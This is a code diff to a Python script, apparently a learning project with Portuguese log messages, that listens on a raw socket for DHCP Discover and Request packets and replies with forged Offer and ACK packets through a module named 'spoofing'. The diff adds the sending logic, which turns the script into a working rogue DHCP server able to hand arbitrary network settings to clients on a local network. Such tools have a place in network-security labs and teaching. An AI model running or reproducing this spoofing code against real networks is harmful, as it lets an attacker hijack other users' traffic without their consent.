@@ -1,7 +1,12 @@
 #!/usr/bin/python3 -tt
 import argparse
 from socket import socket, htons, SOCK_RAW, AF_PACKET
-from spoofing.packet import parse, IP_PROTOCOL, DhcpOffer
+from spoofing.packet import parse, IP_PROTOCOL
+from spoofing.assembler import DhcpPacket
+
+
+OFFER = 1
+ACK = 2
 
 class log:
 
@@ -49,12 +54,16 @@ def spoof_init():
         if packet.ip.udp.dhcp.type == 1:
             if packet.ip.udp.dhcp.dhcpOptions.dhcpType == 1:
                 print ('    >is a Discover')
-                #print (recv)
+                print ('criando pacote de request')
+                pacote = DhcpPacket(OFFER, packet.ip.udp.dhcp.transaction_id, packet.origin_mac, packet.ip.udp.dhcp.dhcpOptions.requested_ip).packet
+                #print(pacote)
+                s.send(pacote)
             elif packet.ip.udp.dhcp.dhcpOptions.dhcpType == 3:
                 print ('    >is a Request')
-            print ('criando pacote de request')
-            pacote = DhcpOffer(packet.ip.udp.dhcp.transaction_id, packet.origin_mac, packet.ip.udp.dhcp.client_ip).packet
-            print(pacote)
-            s.send(pacote)
+                pacote = DhcpPacket(ACK, packet.ip.udp.dhcp.transaction_id, packet.origin_mac, packet.ip.udp.dhcp.dhcpOptions.requested_ip).packet
+                s.send(pacote)
+
+
+           
 
 
